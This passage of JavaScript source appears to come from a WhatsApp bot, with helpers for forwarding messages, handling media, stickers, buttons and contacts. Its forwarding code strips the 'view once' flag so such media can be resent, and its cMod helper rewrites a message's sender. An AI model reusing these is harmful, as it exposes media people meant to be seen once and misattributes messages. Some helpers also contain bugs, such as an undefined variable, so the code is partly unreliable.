          vtype = Object.keys(message.message.viewOnceMessage.message)[0]
          delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
          delete message.message.viewOnceMessage.message[vtype].viewOnce
          message.message = {
              ...message.message.viewOnceMessage.message
          }
      }
    
      let mtype = Object.keys(message.message)[0]
      let content = await generateForwardMessageContent(message, forceForward)
      let ctype = Object.keys(content)[0]
      let context = {}
      if (mtype != "conversation") context = message.message[mtype].contextInfo
      content[ctype].contextInfo = {
          ...context,
          ...content[ctype].contextInfo
      }
      const waMessage = await generateWAMessageFromContent(jid, content, options ? {
          ...content[ctype],
          ...options,
          ...(options.contextInfo ? {
              contextInfo: {
                  ...content[ctype].contextInfo,
                  ...options.contextInfo
              }
          } : {})
      } : {})
      await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id })
      return waMessage
    }
    //=================================================
    conn.downloadAndSaveMediaMessage = async(message, filename, attachExtension = true) => {
      let quoted = message.msg ? message.msg : message
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(quoted, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
      let type = await FileType.fromBuffer(buffer)
      trueFileName = attachExtension ? (filename + '.' + type.ext) : filename
          // save to file
      await fs.writeFileSync(trueFileName, buffer)
      return trueFileName
    }
    //=================================================
    conn.downloadMediaMessage = async(message) => {
      let mime = (message.msg || message).mimetype || ''
      let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0]
      const stream = await downloadContentFromMessage(message, messageType)
      let buffer = Buffer.from([])
      for await (const chunk of stream) {
          buffer = Buffer.concat([buffer, chunk])
      }
    
      return buffer
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} message
    * @param {*} forceForward
    * @param {*} options
    * @returns
    */
    //================================================
    conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
                  let mime = '';
                  let res = await axios.head(url)
                  mime = res.headers['content-type']
                  if (mime.split("/")[1] === "gif") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, gifPlayback: true, ...options }, { quoted: quoted, ...options })
                  }
                  let type = mime.split("/")[0] + "Message"
                  if (mime === "application/pdf") {
                    return conn.sendMessage(jid, { document: await getBuffer(url), mimetype: 'application/pdf', caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "image") {
                    return conn.sendMessage(jid, { image: await getBuffer(url), caption: caption, ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "video") {
                    return conn.sendMessage(jid, { video: await getBuffer(url), caption: caption, mimetype: 'video/mp4', ...options }, { quoted: quoted, ...options })
                  }
                  if (mime.split("/")[0] === "audio") {
                    return conn.sendMessage(jid, { audio: await getBuffer(url), caption: caption, mimetype: 'audio/mpeg', ...options }, { quoted: quoted, ...options })
                  }
                }
    //==========================================================
    conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
      //let copy = message.toJSON()
      let mtype = Object.keys(copy.message)[0]
      let isEphemeral = mtype === 'ephemeralMessage'
      if (isEphemeral) {
          mtype = Object.keys(copy.message.ephemeralMessage.message)[0]
      }
      let msg = isEphemeral ? copy.message.ephemeralMessage.message : copy.message
      let content = msg[mtype]
      if (typeof content === 'string') msg[mtype] = text || content
      else if (content.caption) content.caption = text || content.caption
      else if (content.text) content.text = text || content.text
      if (typeof content !== 'string') msg[mtype] = {
          ...content,
          ...options
      }
      if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      else if (copy.key.participant) sender = copy.key.participant = sender || copy.key.participant
      if (copy.key.remoteJid.includes('@s.whatsapp.net')) sender = sender || copy.key.remoteJid
      else if (copy.key.remoteJid.includes('@broadcast')) sender = sender || copy.key.remoteJid
      copy.key.remoteJid = jid
      copy.key.fromMe = sender === conn.user.id
    
      return proto.WebMessageInfo.fromObject(copy)
    }
    
    
    /**
    *
    * @param {*} path
    * @returns
    */
    //=====================================================
    conn.getFile = async(PATH, save) => {
      let res
      let data = Buffer.isBuffer(PATH) ? PATH : /^data:.*?\/.*?;base64,/i.test(PATH) ? Buffer.from(PATH.split `,` [1], 'base64') : /^https?:\/\//.test(PATH) ? await (res = await getBuffer(PATH)) : fs.existsSync(PATH) ? (filename = PATH, fs.readFileSync(PATH)) : typeof PATH === 'string' ? PATH : Buffer.alloc(0)
          //if (!Buffer.isBuffer(data)) throw new TypeError('Result is not a buffer')
      let type = await FileType.fromBuffer(data) || {
          mime: 'application/octet-stream',
          ext: '.bin'
      }
      let filename = path.join(__filename, __dirname + new Date * 1 + '.' + type.ext)
      if (data && save) fs.promises.writeFile(filename, data)
      return {
          res,
          filename,
          size: await getSizeMedia(data),
          ...type,
          data
      }
    
    }
    //=====================================================
    conn.sendFile = async(jid, PATH, fileName, quoted = {}, options = {}) => {
      let types = await conn.getFile(PATH, true)
      let { filename, size, ext, mime, data } = types
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif.js')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: Config.packname, author: Config.packname, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    //=====================================================
    conn.parseMention = async(text) => {
      return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
    }
    //=====================================================
    conn.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
      let types = await conn.getFile(path, true)
      let { mime, ext, res, data, filename } = types
      if (res && res.status !== 200 || file.length <= 65536) {
          try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
      }
      let type = '',
          mimetype = mime,
          pathFile = filename
      if (options.asDocument) type = 'document'
      if (options.asSticker || /webp/.test(mime)) {
          let { writeExif } = require('./exif')
          let media = { mimetype: mime, data }
          pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
          await fs.promises.unlink(filename)
          type = 'sticker'
          mimetype = 'image/webp'
      } else if (/image/.test(mime)) type = 'image'
      else if (/video/.test(mime)) type = 'video'
      else if (/audio/.test(mime)) type = 'audio'
      else type = 'document'
      await conn.sendMessage(jid, {
          [type]: { url: pathFile },
          caption,
          mimetype,
          fileName,
          ...options
      }, { quoted, ...options })
      return fs.promises.unlink(pathFile)
    }
    /**
    *
    * @param {*} message
    * @param {*} filename
    * @param {*} attachExtension
    * @returns
    */
    //=====================================================
    conn.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
    //=====================================================
    conn.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifImg(buff, options);
      } else {
        buffer = await imageToWebp(buff);
      }
      await conn.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
    //=====================================================
    conn.sendTextWithMentions = async(jid, text, quoted, options = {}) => conn.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })
    
            /**
             *
             * @param {*} jid
             * @param {*} path
             * @param {*} quoted
             * @param {*} options
             * @returns
             */
    //=====================================================
    conn.sendImage = async(jid, path, caption = '', quoted = '', options) => {
      let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
      return await conn.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} path
    * @param {*} caption
    * @param {*} quoted
    * @param {*} options
    * @returns
    */
    //=====================================================
    conn.sendText = (jid, text, quoted = '', options) => conn.sendMessage(jid, { text: text, ...options }, { quoted })
    
    /**
     *
     * @param {*} jid
     * @param {*} path
     * @param {*} caption
     * @param {*} quoted
     * @param {*} options
     * @returns
     */
    //=====================================================
    conn.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
      let buttonMessage = {
              text,
              footer,
              buttons,
              headerType: 2,
              ...options
          }
          //========================================================================================================================================
      conn.sendMessage(jid, buttonMessage, { quoted, ...options })
    }
    //=====================================================
    conn.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
      let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: conn.waUploadToServer })
      var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
          templateMessage: {
              hydratedTemplate: {
                  imageMessage: message.imageMessage,
                  "hydratedContentText": text,
                  "hydratedFooterText": footer,
                  "hydratedButtons": but
              }
          }
      }), options)
      conn.relayMessage(jid, template.message, { messageId: template.key.id })
    }
    
    /**
    *
    * @param {*} jid
    * @param {*} buttons
    * @param {*} caption
    * @param {*} footer
    * @param {*} quoted
    * @param {*} options
    */
    //=====================================================
    conn.getName = (jid, withoutContact = false) => {
            id = conn.decodeJid(jid);

            withoutContact = conn.withoutContact || withoutContact;

            let v;

            if (id.endsWith('@g.us'))
                return new Promise(async resolve => {
                    v = store.contacts[id] || {};

                    if (!(v.name.notify || v.subject))
                        v = conn.groupMetadata(id) || {};

                    resolve(
                        v.name ||
                            v.subject ||
                            PhoneNumber(
                                '+' + id.replace('@s.whatsapp.net', ''),
                            ).getNumber('international'),
                    );
                });
            else
                v =
                    id === '0@s.whatsapp.net'
                        ? {
                                id,

                                name: 'WhatsApp',
                          }
                        : id === conn.decodeJid(conn.user.id)
                        ? conn.user
                        : store.contacts[id] || {};

            return (
                (withoutContact ? '' : v.name) ||
                v.subject ||
                v.verifiedName ||
                PhoneNumber(
                    '+' + jid.replace('@s.whatsapp.net', ''),
                ).getNumber('international')
            );
        };

        // Vcard Functionality
        conn.sendContact = async (jid, kon, quoted = '', opts = {}) => {
            let list = [];
            for (let i of kon) {
                list.push({
                    displayName: await conn.getName(i + '@s.whatsapp.net'),
                    vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await conn.getName(
                        i + '@s.whatsapp.net',
                    )}\nFN:${
                        global.OwnerName
                    }\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${
                        global.email
                    }\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${
                        global.github
                    }/khan-xmd\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${
                        global.location
                    };;;;\nitem4.X-ABLabel:Region\nEND:VCARD`,
                });
            }
            conn.sendMessage(
                jid,
                {
                    contacts: {
                        displayName: `${list.length} Contact`,
                        contacts: list,
                    },
                    ...opts,
                },
                { quoted },
            );
        };

        // Status aka brio
        conn.setStatus = status => {
            conn.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [
                    {
                        tag: 'status',
                        attrs: {},
                        content: Buffer.from(status, 'utf-8'),
                    },
                ],
            });
            return status;
        };
    conn.serializeM = mek => sms(conn, mek, store);
  }
  
  app.get("/", (req, res) => {
  res.send("GARFIELD-WHATSAPP-BOT-v10 STARTED ✅");
  });
  app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
  setTimeout(() => {
  connectToWA()
  }, 4000);
